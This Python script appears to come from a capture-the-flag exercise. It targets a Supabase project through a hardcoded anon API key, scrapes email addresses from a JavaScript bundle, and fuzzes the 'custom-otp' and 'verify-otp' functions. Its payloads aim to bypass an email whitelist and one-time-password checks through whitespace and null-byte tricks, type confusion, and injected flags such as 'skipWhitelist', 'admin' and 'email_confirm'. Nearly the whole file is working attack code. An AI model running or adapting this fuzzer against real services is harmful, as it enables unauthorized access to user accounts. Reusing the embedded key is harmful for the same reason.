import urllib.request, urllib.error, ssl, json, re

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()

# 1) hunt for emails in the bundle
js=open(r"C:\Users\mayan\OneDrive\Desktop\ctf\dome ctf\tsr_fresh.js","r",encoding="utf-8",errors="replace").read()
emails=sorted(set(re.findall(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}', js)))
print("emails in bundle:", emails)

def call(fn, body):
    url=f"{BASE}/functions/v1/{fn}"
    r=urllib.request.Request(url, data=json.dumps(body).encode(), method="POST",
      headers={"apikey":ANON,"Authorization":f"Bearer {ANON}","Content-Type":"application/json"})
    try:
        resp=urllib.request.urlopen(r,timeout=20,context=ctx); return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return "ERR", str(e)

print("\n=== custom-otp whitelist bypass fuzz ===")
cand=[
 {"email":"a@b.com "},{"email":" a@b.com"},{"email":"A@B.COM"},
 {"email":["a@b.com"]},{"email":{"x":1}},
 {"email":"a@b.com","skipWhitelist":True},{"email":"a@b.com","admin":True},
 {"email":"a@b.com\n"},{"email":"a@b.com\u0000"},
 {"email":"%"},{"email":"*"},{"email":""},{},
]
for c in cand:
    s,o=call("custom-otp",c); print(f"  {c} -> {s} {o[:120]}")

print("\n=== verify-otp bypass fuzz (email=attacker) ===")
em="attacker@example.com"
cand2=[
 {"email":em},{"email":em,"code":None},{"email":em,"code":""},
 {"email":em,"code":123456},{"email":em,"code":"000000 "},
 {"email":em,"code":["000000"]},{"email":em,"token_hash":"x"},
 {"email":em,"code":"000000","email_confirm":True},
 {"code":"000000"},
]
for c in cand2:
    s,o=call("verify-otp",c); print(f"  {c} -> {s} {o[:160]}")
